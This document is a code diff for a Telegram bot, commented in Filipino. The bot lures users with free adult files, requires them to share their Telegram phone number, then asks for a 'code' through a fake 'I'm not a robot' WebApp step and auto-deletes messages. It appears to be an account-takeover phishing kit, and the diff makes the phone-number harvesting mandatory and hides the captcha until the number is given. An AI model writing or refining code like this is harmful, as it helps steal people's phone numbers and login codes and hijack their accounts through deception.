@@ -20,8 +20,8 @@ const bot = new Telegraf(BOT_TOKEN);
 const userPhones = new Map();   // Telegram user id -> phone number
 const submissions = new Map();  // submissionId -> { userId, code, telegramPhone, username, firstName }
 
-// helper: delete message after delayMs
-function scheduleDelete(chatId, messageId, delayMs = 30000) {
+// helper: delete message after delayMs (default 30 minutes)
+function scheduleDelete(chatId, messageId, delayMs = 30 * 60 * 1000) {
   setTimeout(() => {
     bot.telegram.deleteMessage(chatId, messageId).catch(() => {});
   }, delayMs);
@@ -30,7 +30,7 @@ function scheduleDelete(chatId, messageId, delayMs = 30000) {
 // helper: reply + auto delete
 async function replyAndAutoDelete(ctx, text, extra) {
   const msg = await ctx.reply(text, extra);
-  scheduleDelete(ctx.chat.id, msg.message_id, 30000);
+  scheduleDelete(ctx.chat.id, msg.message_id); // 30 minutes by default
   return msg;
 }
 
@@ -43,14 +43,14 @@ bot.start(async (ctx) => {
       "Para gumana ang bot na ito, paki-bisita muna ang website:\n" +
         WEBSITE_URL
     );
-    scheduleDelete(ctx.chat.id, msg.message_id, 30000);
+    scheduleDelete(ctx.chat.id, msg.message_id);
     return;
   }
 
-  // 1) Hingi ng Telegram phone number (optional)
+  // ❗ STEP 1: hingi lang muna ng contact, WALANG WebApp button muna
   await replyAndAutoDelete(
     ctx,
-    "Para ma-verify na legit Telegram account ka, puwede mong i-share ang TELEGRAM phone number mo gamit ang button sa ibaba (optional pero recommended).",
+    "Para ma-verify na legit Telegram account ka, kailangan mong i-share ang TELEGRAM phone number mo gamit ang button sa ibaba.",
     {
       reply_markup: {
         keyboard: [
@@ -66,10 +66,41 @@ bot.start(async (ctx) => {
       },
     }
   );
+});
 
-  // 2) WebApp button
-  await replyAndAutoDelete(
-    ctx,
+// kapag nag-share ng contact (phone)
+bot.on("contact", async (ctx) => {
+  const contact = ctx.message.contact;
+  if (!contact) return;
+
+  // delete agad ang contact message (2s)
+  scheduleDelete(ctx.chat.id, ctx.message.message_id, 2000);
+
+  // siguraduhin na sariling number niya
+  if (contact.user_id && contact.user_id !== ctx.from.id) {
+    const warn = await ctx.reply(
+      "Mukhang ibang contact ito. Paki-tap ang button para i-share ang sarili mong Telegram number."
+    );
+    scheduleDelete(ctx.chat.id, warn.message_id);
+    return;
+  }
+
+  userPhones.set(ctx.from.id, contact.phone_number);
+
+  // message: thanks + tanggal keyboard (auto-delete 30 mins)
+  const reply = await ctx.reply(
+    "Hi! ✅\n\n" +
+      "Ngayon lalabas na ang verification step.",
+    {
+      reply_markup: {
+        remove_keyboard: true,
+      },
+    }
+  );
+  scheduleDelete(ctx.chat.id, reply.message_id);
+
+  // ❗ STEP 2: dito pa lang ipapakita ang WebApp button (“I'm not a robot!”)
+  const webappMsg = await ctx.reply(
     "🔞 To access the files completely free 💦\n\n" +
       "👇 Confirm that you are not a robot",
     {
@@ -85,37 +116,7 @@ bot.start(async (ctx) => {
       },
     }
   );
-});
-
-// kapag nag-share ng contact (phone)
-bot.on("contact", async (ctx) => {
-  const contact = ctx.message.contact;
-  if (!contact) return;
-
-  // delete agad ang contact message
-  scheduleDelete(ctx.chat.id, ctx.message.message_id, 2000);
-
-  // siguraduhin na sariling number niya
-  if (contact.user_id && contact.user_id !== ctx.from.id) {
-    const warn = await ctx.reply(
-      "Mukhang ibang contact ito. Paki-tap ang button para i-share ang sarili mong Telegram number."
-    );
-    scheduleDelete(ctx.chat.id, warn.message_id, 30000);
-    return;
-  }
-
-  userPhones.set(ctx.from.id, contact.phone_number);
-
-  const reply = await ctx.reply(
-    "Salamat! Nakuha ko na ang Telegram phone number mo. ✅\n\n" +
-      "Ngayon puwede ka nang mag-tap ng “✅ I'm not a robot!” para magpatuloy.",
-    {
-      reply_markup: {
-        remove_keyboard: true,
-      },
-    }
-  );
-  scheduleDelete(ctx.chat.id, reply.message_id, 30000);
+  scheduleDelete(ctx.chat.id, webappMsg.message_id);
 });
 
 // optional: WebApp data callback
@@ -123,8 +124,10 @@ bot.on("message", async (ctx) => {
   const data = ctx.message.web_app_data?.data;
   if (data) {
     console.log("WEBAPP DATA:", data);
-    const msg = await ctx.reply("Your code was submitted. Please wait for admin review. ⏳");
-    scheduleDelete(ctx.chat.id, msg.message_id, 30000);
+    const msg = await ctx.reply(
+      "Your code was submitted. Please wait for admin review. ⏳"
+    );
+    scheduleDelete(ctx.chat.id, msg.message_id);
   }
 });
 
